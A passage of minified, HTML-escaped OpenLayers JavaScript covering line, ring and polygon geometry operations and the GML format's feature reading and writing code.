c=null,d=b&amp;&amp;b.mutual,e,f,g,h,k=[],l=[a],m=0,n=this.components.length;m&lt;n;++m){f=this.components[m];g=!1;for(var p=0;p&lt;l.length;++p)if(e=f.split(l[p],b)){if(d){g=e[0];for(var q=0,r=g.length;q&lt;r;++q)0===q&amp;&amp;k.length?k[k.length-1].addComponent(g[q]):k.push(new OpenLayers.Geometry.MultiLineString([g[q]]));g=!0;e=e[1]}if(e.length){e.unshift(p, 1);Array.prototype.splice.apply(l,e);break}}g||(k.length?k[k.length-1].addComponent(f.clone()):k=[new OpenLayers.Geometry.MultiLineString(f.clone())])}k&amp;&amp;1&lt;k.length?g=!0:k=[];l&amp;&amp;1&lt;l.length?h=!0:l=[];if(g||h)c=d?[k,l]:l;return c},splitWith:function(a,b){var c=null,d=b&amp;&amp;b.mutual,e,f,g,h,k,l;if(a instanceof OpenLayers.Geometry.LineString){l=[];k=[a];for(var m=0,n=this.components.length;m&lt;n;++m){g=!1;f=this.components[m];for(var p=0;p&lt;k.length;++p)if(e=k[p].split(f,b)){d&amp;&amp;(g=e[0],g.length&amp;&amp;(g.unshift(p, 1),Array.prototype.splice.apply(k,g),p+=g.length-2),e=e[1],0===e.length&amp;&amp;(e=[f.clone()]));g=0;for(var q=e.length;g&lt;q;++g)0===g&amp;&amp;l.length?l[l.length-1].addComponent(e[g]):l.push(new OpenLayers.Geometry.MultiLineString([e[g]]));g=!0}g||(l.length?l[l.length-1].addComponent(f.clone()):l=[new OpenLayers.Geometry.MultiLineString([f.clone()])])}}else c=a.split(this);k&amp;&amp;1&lt;k.length?h=!0:k=[];l&amp;&amp;1&lt;l.length?g=!0:l=[];if(h||g)c=d?[k,l]:l;return c},CLASS_NAME:"OpenLayers.Geometry.MultiLineString"});OpenLayers.Geometry.LinearRing=OpenLayers.Class(OpenLayers.Geometry.LineString,{componentTypes:["OpenLayers.Geometry.Point"],addComponent:function(a,b){var c=!1,d=this.components.pop();null==b&amp;&amp;a.equals(d)||(c=OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,arguments));OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,[this.components[0]]);return c},removeComponent:function(a){var b=this.components&amp;&amp;3&lt;this.components.length;b&amp;&amp;(this.components.pop(),OpenLayers.Geometry.Collection.prototype.removeComponent.apply(this, arguments),OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,[this.components[0]]));return b},move:function(a,b){for(var c=0,d=this.components.length;c&lt;d-1;c++)this.components[c].move(a,b)},rotate:function(a,b){for(var c=0,d=this.components.length;c&lt;d-1;++c)this.components[c].rotate(a,b)},resize:function(a,b,c){for(var d=0,e=this.components.length;d&lt;e-1;++d)this.components[d].resize(a,b,c);return this},transform:function(a,b){if(a&amp;&amp;b){for(var c=0,d=this.components.length;c&lt;d-1;c++)this.components[c].transform(a, b);this.bounds=null}return this},getCentroid:function(){if(this.components){var a=this.components.length;if(0&lt;a&amp;&amp;2>=a)return this.components[0].clone();if(2&lt;a){var b=0,c=0,d=this.components[0].x,e=this.components[0].y,f=-1*this.getArea();if(0!=f){for(var g=0;g&lt;a-1;g++)var h=this.components[g],k=this.components[g+1],b=b+(h.x+k.x-2*d)*((h.x-d)*(k.y-e)-(k.x-d)*(h.y-e)),c=c+(h.y+k.y-2*e)*((h.x-d)*(k.y-e)-(k.x-d)*(h.y-e));b=d+b/(6*f);a=e+c/(6*f)}else{for(g=0;g&lt;a-1;g++)b+=this.components[g].x,c+=this.components[g].y; b/=a-1;a=c/(a-1)}return new OpenLayers.Geometry.Point(b,a)}return null}},getArea:function(){var a=0;if(this.components&amp;&amp;2&lt;this.components.length){for(var b=a=0,c=this.components.length;b&lt;c-1;b++)var d=this.components[b],e=this.components[b+1],a=a+(d.x+e.x)*(e.y-d.y);a=-a/2}return a},getGeodesicArea:function(a){var b=this;if(a){var c=new OpenLayers.Projection("EPSG:4326");c.equals(a)||(b=this.clone().transform(a,c))}a=0;c=b.components&amp;&amp;b.components.length;if(2&lt;c){for(var d,e,f=0;f&lt;c-1;f++)d=b.components[f], e=b.components[f+1],a+=OpenLayers.Util.rad(e.x-d.x)*(2+Math.sin(OpenLayers.Util.rad(d.y))+Math.sin(OpenLayers.Util.rad(e.y)));a=40680631590769*a/2}return a},containsPoint:function(a){var b=OpenLayers.Number.limitSigDigs,c=b(a.x,14);a=b(a.y,14);for(var d=this.components.length-1,e,f,g,h,k,l=0,m=0;m&lt;d;++m)if(e=this.components[m],g=b(e.x,14),e=b(e.y,14),f=this.components[m+1],h=b(f.x,14),f=b(f.y,14),e==f){if(a==e&amp;&amp;(g&lt;=h&amp;&amp;c>=g&amp;&amp;c&lt;=h||g>=h&amp;&amp;c&lt;=g&amp;&amp;c>=h)){l=-1;break}}else{k=b((a-f)*((h-g)/(f-e))+h,14);if(k== c&amp;&amp;(e&lt;f&amp;&amp;a>=e&amp;&amp;a&lt;=f||e>f&amp;&amp;a&lt;=e&amp;&amp;a>=f)){l=-1;break}k&lt;=c||g!=h&amp;&amp;(k&lt;Math.min(g,h)||k>Math.max(g,h))||(e&lt;f&amp;&amp;a>=e&amp;&amp;a&lt;f||e>f&amp;&amp;a&lt;e&amp;&amp;a>=f)&amp;&amp;++l}return-1==l?1:!!(l&amp;1)},intersects:function(a){var b=!1;if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.containsPoint(a);else if("OpenLayers.Geometry.LineString"==a.CLASS_NAME)b=a.intersects(this);else if("OpenLayers.Geometry.LinearRing"==a.CLASS_NAME)b=OpenLayers.Geometry.LineString.prototype.intersects.apply(this,[a]);else for(var c=0,d=a.components.length;c&lt; d&amp;&amp;!(b=a.components[c].intersects(this));++c);return b},getVertices:function(a){return!0===a?[]:this.components.slice(0,this.components.length-1)},CLASS_NAME:"OpenLayers.Geometry.LinearRing"});OpenLayers.Geometry.Polygon=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:["OpenLayers.Geometry.LinearRing"],getArea:function(){var a=0;if(this.components&amp;&amp;0&lt;this.components.length)for(var a=a+Math.abs(this.components[0].getArea()),b=1,c=this.components.length;b&lt;c;b++)a-=Math.abs(this.components[b].getArea());return a},getGeodesicArea:function(a){var b=0;if(this.components&amp;&amp;0&lt;this.components.length)for(var b=b+Math.abs(this.components[0].getGeodesicArea(a)),c=1,d=this.components.length;c&lt; d;c++)b-=Math.abs(this.components[c].getGeodesicArea(a));return b},containsPoint:function(a){var b=this.components.length,c=!1;if(0&lt;b&amp;&amp;(c=this.components[0].containsPoint(a),1!==c&amp;&amp;c&amp;&amp;1&lt;b))for(var d,e=1;e&lt;b;++e)if(d=this.components[e].containsPoint(a)){c=1===d?1:!1;break}return c},intersects:function(a){var b=!1,c,d;if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.containsPoint(a);else if("OpenLayers.Geometry.LineString"==a.CLASS_NAME||"OpenLayers.Geometry.LinearRing"==a.CLASS_NAME){c=0;for(d= this.components.length;c&lt;d&amp;&amp;!(b=a.intersects(this.components[c]));++c);if(!b)for(c=0,d=a.components.length;c&lt;d&amp;&amp;!(b=this.containsPoint(a.components[c]));++c);}else for(c=0,d=a.components.length;c&lt;d&amp;&amp;!(b=this.intersects(a.components[c]));++c);if(!b&amp;&amp;"OpenLayers.Geometry.Polygon"==a.CLASS_NAME){var e=this.components[0];c=0;for(d=e.components.length;c&lt;d&amp;&amp;!(b=a.containsPoint(e.components[c]));++c);}return b},distanceTo:function(a,b){return b&amp;&amp;!1===b.edge&amp;&amp;this.intersects(a)?0:OpenLayers.Geometry.Collection.prototype.distanceTo.apply(this, [a,b])},CLASS_NAME:"OpenLayers.Geometry.Polygon"});OpenLayers.Geometry.Polygon.createRegularPolygon=function(a,b,c,d){var e=Math.PI*(1/c-0.5);d&amp;&amp;(e+=d/180*Math.PI);for(var f,g=[],h=0;h&lt;c;++h)f=e+2*h*Math.PI/c,d=a.x+b*Math.cos(f),f=a.y+b*Math.sin(f),g.push(new OpenLayers.Geometry.Point(d,f));a=new OpenLayers.Geometry.LinearRing(g);return new OpenLayers.Geometry.Polygon([a])};OpenLayers.Geometry.MultiPolygon=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:["OpenLayers.Geometry.Polygon"],CLASS_NAME:"OpenLayers.Geometry.MultiPolygon"});OpenLayers.Format.GML=OpenLayers.Class(OpenLayers.Format.XML,{featureNS:"http://mapserver.gis.umn.edu/mapserver",featurePrefix:"feature",featureName:"featureMember",layerName:"features",geometryName:"geometry",collectionName:"FeatureCollection",gmlns:"http://www.opengis.net/gml",extractAttributes:!0,xy:!0,initialize:function(a){this.regExes={trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g};OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){"string"== typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a=this.getElementsByTagNameNS(a.documentElement,this.gmlns,this.featureName);for(var b=[],c=0;c&lt;a.length;c++){var d=this.parseFeature(a[c]);d&amp;&amp;b.push(d)}return b},parseFeature:function(a){for(var b="MultiPolygon Polygon MultiLineString LineString MultiPoint Point Envelope".split(" "),c,d,e,f=0;f&lt;b.length;++f)if(c=b[f],d=this.getElementsByTagNameNS(a,this.gmlns,c),0&lt;d.length){if(e=this.parseGeometry[c.toLowerCase()])e=e.apply(this, [d[0]]),this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.transform(this.externalProjection,this.internalProjection);else throw new TypeError("Unsupported geometry type: "+c);break}var g;c=this.getElementsByTagNameNS(a,this.gmlns,"Box");for(f=0;f&lt;c.length;++f)b=c[f],d=this.parseGeometry.box.apply(this,[b]),b=b.parentNode,"boundedBy"===(b.localName||b.nodeName.split(":").pop())?g=d:e=d.toGeometry();var h;this.extractAttributes&amp;&amp;(h=this.parseAttributes(a));h=new OpenLayers.Feature.Vector(e,h);h.bounds= g;h.gml={featureType:a.firstChild.nodeName.split(":")[1],featureNS:a.firstChild.namespaceURI,featureNSPrefix:a.firstChild.prefix};a=a.firstChild;for(var k;a&amp;&amp;(1!=a.nodeType||!(k=a.getAttribute("fid")||a.getAttribute("id")));)a=a.nextSibling;h.fid=k;return h},parseGeometry:{point:function(a){var b,c;c=[];b=this.getElementsByTagNameNS(a,this.gmlns,"pos");0&lt;b.length&amp;&amp;(c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));0==c.length&amp;&amp;(b=this.getElementsByTagNameNS(a, this.gmlns,"coordinates"),0&lt;b.length&amp;&amp;(c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.removeSpace,""),c=c.split(",")));0==c.length&amp;&amp;(b=this.getElementsByTagNameNS(a,this.gmlns,"coord"),0&lt;b.length&amp;&amp;(a=this.getElementsByTagNameNS(b[0],this.gmlns,"X"),b=this.getElementsByTagNameNS(b[0],this.gmlns,"Y"),0&lt;a.length&amp;&amp;0&lt;b.length&amp;&amp;(c=[a[0].firstChild.nodeValue,b[0].firstChild.nodeValue])));2==c.length&amp;&amp;(c[2]=null);return this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1], c[0],c[2])},multipoint:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,"Point");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.point.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiPoint(b)},linestring:function(a,b){var c,d;d=[];var e=[];c=this.getElementsByTagNameNS(a,this.gmlns,"posList");if(0&lt;c.length){d=this.getChildValue(c[0]);d=d.replace(this.regExes.trimSpace,"");d=d.split(this.regExes.splitSpace);var f=parseInt(c[0].getAttribute("dimension")), g,h,k;for(c=0;c&lt;d.length/f;++c)g=c*f,h=d[g],k=d[g+1],g=2==f?null:d[g+2],this.xy?e.push(new OpenLayers.Geometry.Point(h,k,g)):e.push(new OpenLayers.Geometry.Point(k,h,g))}if(0==d.length&amp;&amp;(c=this.getElementsByTagNameNS(a,this.gmlns,"coordinates"),0&lt;c.length))for(d=this.getChildValue(c[0]),d=d.replace(this.regExes.trimSpace,""),d=d.replace(this.regExes.trimComma,","),f=d.split(this.regExes.splitSpace),c=0;c&lt;f.length;++c)d=f[c].split(","),2==d.length&amp;&amp;(d[2]=null),this.xy?e.push(new OpenLayers.Geometry.Point(d[0], d[1],d[2])):e.push(new OpenLayers.Geometry.Point(d[1],d[0],d[2]));d=null;0!=e.length&amp;&amp;(d=b?new OpenLayers.Geometry.LinearRing(e):new OpenLayers.Geometry.LineString(e));return d},multilinestring:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,"LineString");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.linestring.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiLineString(b)},polygon:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,"LinearRing"); var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.linestring.apply(this,[a[d],!0]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.Polygon(b)},multipolygon:function(a){a=this.getElementsByTagNameNS(a,this.gmlns,"Polygon");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.polygon.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiPolygon(b)},envelope:function(a){var b=[],c,d,e=this.getElementsByTagNameNS(a,this.gmlns,"lowerCorner");if(0&lt;e.length){c= [];0&lt;e.length&amp;&amp;(c=e[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));2==c.length&amp;&amp;(c[2]=null);var f=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])}a=this.getElementsByTagNameNS(a,this.gmlns,"upperCorner");if(0&lt;a.length){c=[];0&lt;a.length&amp;&amp;(c=a[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));2==c.length&amp;&amp;(c[2]=null);var g=this.xy?new OpenLayers.Geometry.Point(c[0], c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])}f&amp;&amp;g&amp;&amp;(b.push(new OpenLayers.Geometry.Point(f.x,f.y)),b.push(new OpenLayers.Geometry.Point(g.x,f.y)),b.push(new OpenLayers.Geometry.Point(g.x,g.y)),b.push(new OpenLayers.Geometry.Point(f.x,g.y)),b.push(new OpenLayers.Geometry.Point(f.x,f.y)),b=new OpenLayers.Geometry.LinearRing(b),d=new OpenLayers.Geometry.Polygon([b]));return d},box:function(a){var b=this.getElementsByTagNameNS(a,this.gmlns,"coordinates"),c=a=null;0&lt;b.length&amp;&amp;(b=b[0].firstChild.nodeValue, b=b.split(" "),2==b.length&amp;&amp;(a=b[0].split(","),c=b[1].split(",")));if(null!==a&amp;&amp;null!==c)return new OpenLayers.Bounds(parseFloat(a[0]),parseFloat(a[1]),parseFloat(c[0]),parseFloat(c[1]))}},parseAttributes:function(a){var b={};a=a.firstChild;for(var c,d,e;a;){if(1==a.nodeType){a=a.childNodes;for(c=0;c&lt;a.length;++c)if(d=a[c],1==d.nodeType)if(e=d.childNodes,1==e.length){if(e=e[0],3==e.nodeType||4==e.nodeType)d=d.prefix?d.nodeName.split(":")[1]:d.nodeName,e=e.nodeValue.replace(this.regExes.trimSpace, ""),b[d]=e}else b[d.nodeName.split(":").pop()]=null;break}a=a.nextSibling}return b},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=this.createElementNS("http://www.opengis.net/wfs","wfs:"+this.collectionName),c=0;c&lt;a.length;c++)b.appendChild(this.createFeatureXML(a[c]));return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.featureNS,this.featurePrefix+":"+this.geometryName);c.appendChild(b); var b=this.createElementNS(this.gmlns,"gml:"+this.featureName),d=this.createElementNS(this.featureNS,this.featurePrefix+":"+this.layerName);d.setAttribute("fid",a.fid||a.id);d.appendChild(c);for(var e in a.attributes){var c=this.createTextNode(a.attributes[e]),f=e.substring(e.lastIndexOf(":")+1),f=this.createElementNS(this.featureNS,this.featurePrefix+":"+f);f.appendChild(c);d.appendChild(f)}b.appendChild(d);return b},buildGeometryNode:function(a){this.externalProjection&amp;&amp;this.internalProjection&amp;&amp; (a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b=a.CLASS_NAME,b=b.substring(b.lastIndexOf(".")+1);return this.buildGeometry[b.toLowerCase()].apply(this,[a])},buildGeometry:{point:function(a){var b=this.createElementNS(this.gmlns,"gml:Point");b.appendChild(this.buildCoordinatesNode(a));return b},multipoint:function(a){var b=this.createElementNS(this.gmlns,"gml:MultiPoint");a=a.components;for(var c,d,e=0;e&lt;a.length;e++)c=this.createElementNS(this.gmlns,"gml:pointMember"), d=this.buildGeometry.point.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},linestring:function(a){var b=this.createElementNS(this.gmlns,"gml:LineString");b.appendChild(this.buildCoordinatesNode(a));return b},multilinestring:function(a){var b=this.createElementNS(this.gmlns,"gml:MultiLineString");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=this.createElementNS(this.gmlns,"gml:lineStringMember"),d=this.buildGeometry.linestring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c); return b},linearring:function(a){var b=this.createElementNS(this.gmlns,"gml:LinearRing");b.appendChild(this.buildCoordinatesNode(a));return b},polygon:function(a){var b=this.createElementNS(this.gmlns,"gml:Polygon");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=0==e?"outerBoundaryIs":"innerBoundaryIs",c=this.createElementNS(this.gmlns,"gml:"+c),d=this.buildGeometry.linearring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},multipolygon:function(a){var b=this.createElementNS(this.gmlns, "gml:MultiPolygon");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=this.createElementNS(this.gmlns,"gml:polygonMember"),d=this.buildGeometry.polygon.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},bounds:function(a){var b=this.createElementNS(this.gmlns,"gml:Box");b.appendChild(this.buildCoordinatesNode(a));return b}},buildCoordinatesNode:function(a){var b=this.createElementNS(this.gmlns,"gml:coordinates");b.setAttribute("decimal",".");b.setAttribute("cs",",");b.setAttribute("ts", " ");var c=[];if(a instanceof OpenLayers.Bounds)c.push(a.left+","+a.bottom),c.push(a.right+","+a.top);else{a=a.components?a.components:[a];for(var d=0;d&lt;a.length;d++)c.push(a[d].x+","+a[d].y)}c=this.createTextNode(c.join(" "));b.appendChild(c);return b},CLASS_NAME:"OpenLayers.Format.GML"});OpenLayers.Format.GML||(OpenLayers.Format.GML={}); OpenLayers.Format.GML.Base=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",wfs:"http://www.opengis.net/wfs"},defaultPrefix:"gml",schemaLocation:null,featureType:null,featureNS:null,geometryName:"geometry",extractAttributes:!0,srsName:null,xy:!0,geometryTypes:null,singleFeatureType:null,regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g,featureMember:/^(.*:)?featureMembers?$/}, initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.setGeometryTypes();a&amp;&amp;a.featureNS&amp;&amp;this.setNamespace("feature",a.featureNS);this.singleFeatureType=!a||"string"===typeof a.featureType},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=[];this.readNode(a,{features:b},!0);if(0==b.length){var c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMember");if(c.length){a= 0;for(var d=c.length;a&lt;d;++a)this.readNode(c[a],{features:b},!0)}else c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMembers"),c.length&amp;&amp;this.readNode(c[0],{features:b},!0)}return b},readNode:function(a,b,c){!0===c&amp;&amp;!0===this.autoConfig&amp;&amp;(this.featureType=null,delete this.namespaceAlias[this.featureNS],delete this.namespaces.feature,this.featureNS=null);this.featureNS||(a.prefix in this.namespaces||a.parentNode.namespaceURI!=this.namespaces.gml||!this.regExes.featureMember.test(a.parentNode.nodeName))|| (this.featureType=a.nodeName.split(":").pop(),this.setNamespace("feature",a.namespaceURI),this.featureNS=a.namespaceURI,this.autoConfig=!0);return OpenLayers.Format.XML.prototype.readNode.apply(this,[a,b])},readers:{gml:{_inherit:function(a,b,c){},featureMember:function(a,b){this.readChildNodes(a,b)},featureMembers:function(a,b){this.readChildNodes(a,b)},name:function(a,b){b.name=this.getChildValue(a)},boundedBy:function(a,b){var c={};this.readChildNodes(a,c);c.components&amp;&amp;0&lt;c.components.length&amp;&amp; (b.bounds=c.components[0])},Point:function(a,b){var c={points:[]};this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(c.points[0])},coordinates:function(a,b){for(var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace),d,e=c.length,f=Array(e),g=0;g&lt;e;++g)d=c[g].split(","),f[g]=this.xy?new OpenLayers.Geometry.Point(d[0],d[1],d[2]):new OpenLayers.Geometry.Point(d[1],d[0],d[2]);b.points=f},coord:function(a, b){var c={};this.readChildNodes(a,c);b.points||(b.points=[]);b.points.push(new OpenLayers.Geometry.Point(c.x,c.y,c.z))},X:function(a,b){b.x=this.getChildValue(a)},Y:function(a,b){b.y=this.getChildValue(a)},Z:function(a,b){b.z=this.getChildValue(a)},MultiPoint:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiPoint(c.components)]},pointMember:function(a,b){this.readChildNodes(a,b)},LineString:function(a, b){var c={};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.LineString(c.points))},MultiLineString:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiLineString(c.components)]},lineStringMember:function(a,b){this.readChildNodes(a,b)},Polygon:function(a,b){var c={outer:null,inner:[]};this.readers.gml._inherit.apply(this, [a,c,b]);this.readChildNodes(a,c);c.inner.unshift(c.outer);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.Polygon(c.inner))},LinearRing:function(a,b){var c={};this.readers.gml._inherit.apply(this,[a,c]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.LinearRing(c.points)]},MultiPolygon:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiPolygon(c.components)]}, polygonMember:function(a,b){this.readChildNodes(a,b)},GeometryCollection:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.Collection(c.components)]},geometryMember:function(a,b){this.readChildNodes(a,b)}},feature:{"*":function(a,b){var c,d=a.localName||a.nodeName.split(":").pop();b.features?this.singleFeatureType||-1===OpenLayers.Util.indexOf(this.featureType,d)?d===this.featureType&amp;&amp;(c="_typeName"):c= "_typeName":0==a.childNodes.length||1==a.childNodes.length&amp;&amp;3==a.firstChild.nodeType?this.extractAttributes&amp;&amp;(c="_attribute"):c="_geometry";c&amp;&amp;this.readers.feature[c].apply(this,[a,b])},_typeName:function(a,b){var c={components:[],attributes:{}};this.readChildNodes(a,c);c.name&amp;&amp;(c.attributes.name=c.name);var d=new OpenLayers.Feature.Vector(c.components[0],c.attributes);this.singleFeatureType||(d.type=a.nodeName.split(":").pop(),d.namespace=a.namespaceURI);var e=a.getAttribute("fid")||this.getAttributeNS(a, this.namespaces.gml,"id");e&amp;&amp;(d.fid=e);this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;d.geometry)&amp;&amp;d.geometry.transform(this.externalProjection,this.internalProjection);c.bounds&amp;&amp;(d.bounds=c.bounds);b.features.push(d)},_geometry:function(a,b){this.geometryName||(this.geometryName=a.nodeName.split(":").pop());this.readChildNodes(a,b)},_attribute:function(a,b){var c=a.localName||a.nodeName.split(":").pop(),d=this.getChildValue(a);b.attributes[c]=d}},wfs:{FeatureCollection:function(a,b){this.readChildNodes(a, b)}}},write:function(a){var b;b=OpenLayers.Util.isArray(a)?"featureMembers":"featureMember";a=this.writeNode("gml:"+b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:{featureMember:function(a){var b=this.createElementNSPlus("gml:featureMember");this.writeNode("feature:_typeName",a,b);return b},MultiPoint:function(a){var b=this.createElementNSPlus("gml:MultiPoint");a=a.components||[a]; for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("pointMember",a[c],b);return b},pointMember:function(a){var b=this.createElementNSPlus("gml:pointMember");this.writeNode("Point",a,b);return b},MultiLineString:function(a){var b=this.createElementNSPlus("gml:MultiLineString");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("lineStringMember",a[c],b);return b},lineStringMember:function(a){var b=this.createElementNSPlus("gml:lineStringMember");this.writeNode("LineString",a,b);return b}, MultiPolygon:function(a){var b=this.createElementNSPlus("gml:MultiPolygon");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("polygonMember",a[c],b);return b},polygonMember:function(a){var b=this.createElementNSPlus("gml:polygonMember");this.writeNode("Polygon",a,b);return b},GeometryCollection:function(a){for(var b=this.createElementNSPlus("gml:GeometryCollection"),c=0,d=a.components.length;c&lt;d;++c)this.writeNode("geometryMember",a.components[c],b);return b},geometryMember:function(a){var b= this.createElementNSPlus("gml:geometryMember");a=this.writeNode("feature:_geometry",a);b.appendChild(a.firstChild);return b}},feature:{_typeName:function(a){var b=this.createElementNSPlus("feature:"+this.featureType,{attributes:{fid:a.fid}});a.geometry&amp;&amp;this.writeNode("feature:_geometry",a.geometry,b);for(var c in a.attributes){var d=a.attributes[c];null!=d&amp;&amp;this.writeNode("feature:_attribute",{name:c,value:d},b)}return b},_geometry:function(a){this.externalProjection&amp;&amp;this.internalProjection&amp;&amp;(a= a.clone().transform(this.internalProjection,this.externalProjection));var b=this.createElementNSPlus("feature:"+this.geometryName);a=this.writeNode("gml:"+this.geometryTypes[a.CLASS_NAME],a,b);this.srsName&amp;&amp;a.setAttribute("srsName",this.srsName);return b},_attribute:function(a){return this.createElementNSPlus("feature:"+a.name,{value:a.value})}},wfs:{FeatureCollection:function(a){for(var b=this.createElementNSPlus("wfs:FeatureCollection"),c=0,d=a.length;c&lt;d;++c)this.writeNode("gml:featureMember", a[c],b);return b}}},setGeometryTypes:function(){this.geometryTypes={"OpenLayers.Geometry.Point":"Point","OpenLayers.Geometry.MultiPoint":"MultiPoint","OpenLayers.Geometry.LineString":"LineString","OpenLayers.Geometry.MultiLineString":"MultiLineString","OpenLayers.Geometry.Polygon":"Polygon","OpenLayers.Geometry.MultiPolygon":"MultiPolygon","OpenLayers.Geometry.Collection":"GeometryCollection"}},CLASS_NAME:"OpenLayers.Format.GML.Base"});OpenLayers.Format.GML.v3=OpenLayers.Class(OpenLayers.Format.GML.Base,{schemaLocation:"http://www.opengis.net/gml http://schemas.opengis.net/gml/3.1.1/profiles/gmlsfProfile/1.0.0/gmlsf.xsd",curve:!1,multiCurve:!0,surface:!1,multiSurface:!0,initialize:function(a){OpenLayers.Format.GML.Base.prototype.initialize.apply(this,[a])},readers:{gml:OpenLayers.Util.applyDefaults({_inherit:function(a,b,c){if(a=parseInt(a.getAttribute("srsDimension"),10)||c&amp;&amp;c.srsDimension)b.srsDimension=a},featureMembers:function(a, b){this.readChildNodes(a,b)},Curve:function(a,b){var c={points:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.LineString(c.points))},segments:function(a,b){this.readChildNodes(a,b)},LineStringSegment:function(a,b){var c={};this.readChildNodes(a,c);c.points&amp;&amp;Array.prototype.push.apply(b.points,c.points)},pos:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(this.regExes.splitSpace), c=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2]);b.points=[c]},posList:function(a,b){for(var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(this.regExes.splitSpace),d=b.srsDimension||parseInt(a.getAttribute("srsDimension")||a.getAttribute("dimension"),10)||2,e,f,g,h=Array(c.length/d),k=0,l=c.length;k&lt;l;k+=d)e=c[k],f=c[k+1],g=2==d?void 0:c[k+2],h[k/d]=this.xy?new OpenLayers.Geometry.Point(e,f,g):new OpenLayers.Geometry.Point(f, e,g);b.points=h},Surface:function(a,b){this.readChildNodes(a,b)},patches:function(a,b){this.readChildNodes(a,b)},PolygonPatch:function(a,b){this.readers.gml.Polygon.apply(this,[a,b])},exterior:function(a,b){var c={};this.readChildNodes(a,c);b.outer=c.components[0]},interior:function(a,b){var c={};this.readChildNodes(a,c);b.inner.push(c.components[0])},MultiCurve:function(a,b){var 